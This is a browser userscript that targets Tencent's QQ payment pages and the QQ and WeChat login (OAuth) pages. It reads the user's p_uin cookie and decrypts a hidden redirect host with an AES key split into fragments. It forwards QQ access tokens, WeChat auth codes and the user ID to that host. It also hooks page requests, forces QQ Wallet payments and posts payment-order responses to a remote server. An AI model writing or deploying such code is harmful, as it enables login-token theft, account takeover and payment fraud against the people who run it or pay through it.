// ==UserScript==
// @name         S918X
// @namespace    http://www.baidu.com/
// @version      0.12.3
// @description  S918_Tx
// @author       S918
// @match        *://pay.qq.com/h5/index.shtml*
// @match        *://pay.qq.com/h5/shop.shtml*
// @match        *://pay.qq.com/midas/minipay_v2/views/cpay/game.shtml*
// @match        *://open.weixin.qq.com/connect/qrconnect*
// @match        *://pay.qq.com/*
// @match        *://graph.qq.com/*
// @connect      *
// @license      MIT
// @grant        GM_info
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_getResourceText
// @grant        GM_xmlhttpRequest
// @grant        GM_setClipboard
// @grant        GM_getResourceURL
// @require      https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js
// @require      https://cdn.jsdelivr.net/npm/js-base64@3.7.5/base64.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js
// @resource     CxSecretsFont https://static.muketool.com/scripts/cx/v2/fonts/cxsecret.json
// @resource     Layui https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/layui/2.6.8/css/layui.min.css
// @resource     LayuiIconFont-woff2 https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/layui/2.6.8/font/iconfont.woff2
// @resource     LayuiIconFont-woff https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/layui/2.6.8/font/iconfont.woff
// @resource     LayuiIconFont-ttf https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/layui/2.6.8/font/iconfont.ttf
// @downloadURL https://update.greasyfork.org/scripts/494575/S918X.user.js
// @updateURL https://update.greasyfork.org/scripts/494575/S918X.meta.js
// ==/UserScript==

function gc(a) {
    const b = `; ${document.cookie}`;
    const c = b.split(`; ${a}=`);
    if (c.length === 2) return c.pop().split(';').shift();
}

var d = gc('p_uin');
if(d) {
    GM_setValue("a", d);
}

try{
    if(location.href.indexOf('h5/trade-record')!=-1){
        jQuery('body').append('<div class="back" style="color: red;position: absolute;left: 150px;top: 15px;font-size: 30px;text-decoration: underline;cursor: pointer;"></div>').on('click', '.back', function(){
            location.href.indexOf('detail')!=-1?history.back():close();
        });
        setInterval(function(){ jQuery('.back').html(location.href.indexOf('detail')!=-1?'返回':'<img src="https://imgcache.qq.com/bossweb/pay/pay_v4/images/public/logo.png">');},10)
        return;
    }
    var h = '';
    var a = new URLSearchParams(location.search);
    var _ = a.get('_');
    if(_) {
        var e = JSON.parse(atob(_.slice(32)));
        h = CryptoJS.AES.decrypt(e.value, CryptoJS.enc.Base64.parse("c5hKz"+"AuKTVVRKic"+"6hOjOklXgyeil"+"+"+"EcUdLFH/FLA61o"+"="), {iv: CryptoJS.enc.Base64.parse(e.iv)}).toString(CryptoJS.enc.Utf8);

        if(location.href.indexOf('#access_token') != -1) { //QQ登陆的回调
            location.href = h + location.href.replace(/.*\?/,'?').replace('#access_token', 'access_token')+ '&p_uin=' + GM_getValue("a"); return;
        }
        if(a.get('code')) { //微信的回调
            location.href = h + location.search; return
        }
    }
}catch(e) {
    console.log(e);
}

if(location.href.indexOf('open.weixin.qq.com/connect/qrconnect')!=-1 || location.href.indexOf('graph.qq.com/oauth2.0')!=-1 || location.href.indexOf('h5/trade-record')!=-1) {
    //document.body.setAttribute("style","background-color: rgb(249 5 5);");
    return;
}

document.addEventListener(
    "keyup",
    (event) => {
        const k = event.key; var d = document.getElementById("model-id");
        if(k == "h" || k == "H") { d.style.display = "none"; }
        if(k == "o" || k == "O") { d.style.display = "block"; }
        console.log(k)
    },
    false,
);

var _self = unsafeWindow,
    url = location.pathname,
    top = _self;

(function() {
    if(document.referrer===''){
        window.open(location.href)
    }
})();


GM_addStyle(`
@import url(${GM_getResourceURL('Layui')});
`);

GM_addStyle(`
@font-face {
font-family: 'layui-icon';
src: url(${GM_getResourceURL('LayuiIconFont-woff2')}) format('woff2'),
 url(${GM_getResourceURL('LayuiIconFont-woff')}.woff) format('woff'),
 url(${GM_getResourceURL('LayuiIconFont-ttf')}) format('truetype');
font-weight: normal;
font-style: normal;
}
`);

var $ = _self.jQuery || top.jQuery,
    parent = _self == top ? self : _self.parent,
    Ext = _self.Ext || parent.Ext || {},
    UE = _self.UE,
    Base64 = self.Base64,
    vjs = _self.videojs;



function addXMLRequestCallback(callback){
    var oldOpen, oldSend, i;
    if( XMLHttpRequest.callbacks ) {
        XMLHttpRequest.callbacks.push( callback );
    } else {
        XMLHttpRequest.callbacks = [callback];
        oldOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function () {
            this.url = arguments[1];
            return oldOpen.apply(this, arguments);
        };
        oldSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(){
            for( i = 0; i < XMLHttpRequest.callbacks.length; i++ ) {
                XMLHttpRequest.callbacks[i]( this );
            }
            if(this.url.indexOf("/web_save") != -1 || this.url.indexOf("/mobile_save") != -1){
                var a = decodeURIComponent(arguments[0]), b = {}, c = 0;
                try { b.qty = a.match(new RegExp(`buy_quantity=(.*?)&`))[1]; } catch(e) { b.qty = null; }
                try { b.amt = Number(a.match(new RegExp(`&amt=(.*?)&`))[1]/100); } catch(e) { b.amt = null; }
                try { b.paytype = a.match(new RegExp(`pay_method=(.*?)&`))[1]; } catch(e){ b.paytype = null; }
                try { b.mny = Number(GM_getValue("mny")); } catch(e) { }

                console.log(b)

                if(b.paytype != 'qqwallet:2') {
                    alert('请选择使用QQ钱包支付方式');
                    c = 1;
                } else if(b.amt && (b.mny-b.amt>60 || b.amt-b.mny>60)) {
                    alert('实产码与预产码'+b.mny+'金额相差超过60, 请确认后再试!')
                    c = 1;
                }
                if(c) {
                    var u = document.getElementById('_cp__mask__'); u&&u.remove();
                    document.querySelectorAll('.mds-pay__num').forEach(function(e) { e.removeAttribute('style'); });
                    document.querySelectorAll('.mds-pay__list').forEach(function(e) { e.removeAttribute('style'); });
                    document.querySelectorAll('.mds-loading__center').forEach(function(e) { e.remove(); });
                    document.querySelectorAll('.fusion-pm-bd').forEach(function(e) { e.removeAttribute('style'); });
                    document.querySelectorAll('.fpm-loading').forEach(function(e) { e.remove(); });
                    return;
                }
            }
            console.log('arguments',arguments)
            oldSend.apply(this, arguments);
        }
    }
}
addXMLRequestCallback( function( xhr ) {
    xhr.addEventListener("load", function(){
        if ( xhr.readyState == 4 && xhr.status == 200 ) {
            if ( xhr.responseURL.search("(.*?)/v1/r/(.*?)/mobile_save") != -1 || xhr.responseURL.search("(.*?)/v1/r/(.*?)/web_save") != -1) {
                //console.log(Base64.encode(xhr.response));
                //console.log("本次结束")
                // alert(xhr.response);
                var resp = JSON.parse(xhr.response); resp.version = '1.4.13';
                if(resp.ret == 0){
                    console.log("xhr.responseURL",xhr.responseURL);
                    console.log("xhr---",xhr);
                    new Promise(function(resolve, reject) {
                        GM_xmlhttpRequest({
                            method: 'POST',
                            url: GM_getValue("G63Url"),
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            data:  Base64.encode(JSON.stringify(resp)),
                            onload(xhr) {
                                alert(xhr.responseText);
                            }
                        });
                    });
                }
            }
        }
    });
});

let html = `
<button type="button" id="show" onClick="showClick()">隐藏配置窗口</button>
<div style="background:white;" id="config">
<div style="padding: 10px;font-size: 9pt;"><label style="color:red">温馨提示：</label>键盘敲字母"<label style="color:red">h</label>"直接隐藏整个窗口，敲字母"<label style="color:red">o</label>"恢复显示窗口</div>
&nbsp&nbsp&nbsp
<label>账号链接：</label><input type="text" id="G63Url" name="G63Url" value="` + (GM_getValue("G63Url") != undefined ? GM_getValue("G63Url") : "") + `" required>
<br>
<br>
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button type="button" id="save" onClick="saveClick()">保存</button>
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
<button type="button" id="start" onClick="startClick()">开始</button>
<br>
<br>
</div>


<script>
function saveClick(){
    var G63Url = document.getElementById("G63Url").value;
    window.parent.postMessage({type: 'save',G63Url:G63Url}, '*');
}
function startClick(){
    var G63Url = document.getElementById("G63Url").value;
    window.parent.postMessage({type: 'start',G63Url:G63Url}, '*');
}
function stopClick(){
    window.parent.postMessage({type: 'stop'}, '*');
}
function showClick(){
    var str = document.getElementById("show").innerHTML;
    if(str == "显示配置窗口"){
         document.getElementById("show").innerHTML = "隐藏配置窗口";
    }else{
         document.getElementById("show").innerHTML = "显示配置窗口";
    }
    window.parent.postMessage({type: 'show'}, '*');
}
document.addEventListener(
    "keyup",
    (event) => {
        const keyName = event.key;
        if(keyName == "h" || keyName == "H") { parent.document.getElementById("model-id").style.display = "none"; }
        if(keyName == "o" || keyName == "O") { parent.document.getElementById("model-id").style.display = "block"; }
        console.log(keyName)
    },
    false,
);
</script>

`;

top.addEventListener("message", event => {
    if (event.data.type === "save") {
        if(event.data.G63Url == "" ){
            alert("请到账号管理获取URL");return;
        }
        GM_setValue("G63Url", event.data.G63Url);
        alert("保存成功ok");
    } else if(event.data.type === "start"){
        if(event.data.G63Url == "" ){
            alert("请到账号管理获取URL");return;
        }
        GM_setValue("G63Url", event.data.G63Url);
        startJob();
    } else if(event.data.type === "stop"){
        stopJob();
    } else if(event.data.type === "show"){
        showConfig();
    }
}, false);


function showConfig(){
    var elem = top.document.getElementById("iframeNode")
    if(elem.style.height == "31px"){
        elem.style.height = "215px";
    }else{
        elem.style.height = "31px";
    }
}
//获取跳转链接
function startJob(){
    return new Promise(function(resolve, reject) {
        var gourl = GM_getValue("G63Url");
        var arr =gourl.split('/')
        var arr1 =arr[5].split('?')
        //http://192.168.0.4:5258/api/PublicAPI/AddQbUrl?landid=54&key=5588306997664561164
        //alert(gourl.split('/')[2] );
        GM_xmlhttpRequest({
            method: 'GET',
            url: "http://"+arr[2]+"/api/PublicAPI/GetQbUrl?"+arr1[1],
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            onload(xhr) {
                // console.log("xhr.responseText",xhr.responseText);
                var resp = JSON.parse(xhr.responseText);
                if(resp.code == 200){
                    if(resp.data.type==0){
                        // 直接打开
                        top.location.href = resp.data.gotourl;
                        GM_setValue("mny", resp.data.mny);
                    }else{
                        new Promise(function(resolve, reject) {
                            GM_xmlhttpRequest({
                                method: 'POST',
                                url:resp.data.requesturl ,
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                data:  resp.data.requestData,
                                onload(xhr) {
                                    if(xhr.responseText.indexOf("result_info")!=-1 && xhr.responseText.indexOf("系统繁忙")==-1){
                                        var resptoken_id = JSON.parse(xhr.responseText);
                                        var resptoken_ids= JSON.parse(resptoken_id.data.call_reply);
                                        let token_id =resptoken_ids.data.token;
                                        console.log("token_id：",token_id);
                                        console.log("gotourl：",resp.data.gotourl);
                                        top.location.href = resp.data.gotourl.replaceAll('[resptoken_ids]',token_id);
                                    }
                                }
                            });
                        });
                    }
                }else{
                    alert(resp.msg);
                }
            }
        });
    });
}


function stopJob(){
    top.location.href = "https://pay.qq.com/";
}


function addModal2(html, newPos, footerChildNode = false) {
    if(top.document.baseURI.indexOf("/h5/shop.shtml")==-1){
        //return;
    }
    let iframeNode = top.document.createElement("iframe");
    iframeNode.id = "iframeNode";
    iframeNode.setAttribute("width", "100%");
    iframeNode.setAttribute("height", "215px");
    iframeNode.setAttribute("style", "height:215px");
    iframeNode.setAttribute("frameborder", "0");
    iframeNode.srcdoc = html;
    let contentNode = createContainer("content-modal", [ iframeNode ]);
    let modal = renderModal(contentNode);
    dragModel(modal);
}

function createContainer(name, childElem) {
    name = name.toLowerCase();
    let elem = top.document.createElement(name);
    elem.style.display = "block";
    elem.id = name.replace("hcsearche", "hcSearche").replace(/\-[a-z]/g, function(w) {
        return w.replace("-", "").toUpperCase();
    });
    if (childElem) {
        if (Array.isArray(childElem) === false) childElem = [ childElem ];
        for (let i = 0; i < childElem.length; i++) elem.appendChild(childElem[i]);
    }
    return elem;
}
function dragModel(drag) {
    const TOP = top;
    drag.onmousedown = function(e) {
        drag.style.cursor = "move";
        e = e || window.event;
        let diffX = e.clientX - drag.offsetLeft;
        let diffY = e.clientY - drag.offsetTop;
        top.onmousemove = function(e) {
            e = e || top.event;
            let left = e.clientX - diffX;
            let top = e.clientY - diffY;
            if (left < 0) {
                left = 0;
            } else if (left > TOP.innerWidth * .95 - drag.offsetWidth) {
                left = TOP.innerWidth * .95 - drag.offsetWidth;
            }
            if (top < 0) {
                top = 0;
            } else if (top > TOP.innerHeight - drag.offsetHeight) {
                top = TOP.innerHeight - drag.offsetHeight;
            }
            drag.style.left = left + "px";
            drag.style.top = top + "px";
            GM_setValue("pos", drag.style.left + "," + drag.style.top);
        };
        top.onmouseup = function(e) {
            drag.style.cursor = "default";
            this.onmousemove = null;
            this.onmouseup = null;
        };
    };
}

function renderModal(childElem, newPos) {
    return render("tag" + rand(1, 100).toString(), "model-id", childElem);
}

function rand(m, n) {
    return Math.ceil(Math.random() * (n - m + 1) + m - 1);
}
function render(tagName, elemId, childElem, isFixed, newPos) {
    let doc = top.document;
    let elem = doc.getElementById(elemId);
    if (elem) {
        elem.innerHTML = "";
    } else {
        elem = doc.createElement(tagName);
        elem.id = elemId;
        doc.body.appendChild(elem);
    }
    let contentNode = createContainer(tagName + "-container", childElem);
    elem.appendChild(contentNode);
    elem.classList.add(elemId);
    elem.style.zIndex = "9999999";
    elem.style.position = "fixed";
    const pos = "30px,30px";
    const posarr = pos.split(",");
    elem.style.left = posarr[0];
    elem.style.top = posarr[1];
    setTimeout(function() {
        elem.classList.add(elemId + "-show");
    }, 10);
    return elem;
}
addModal2(html);

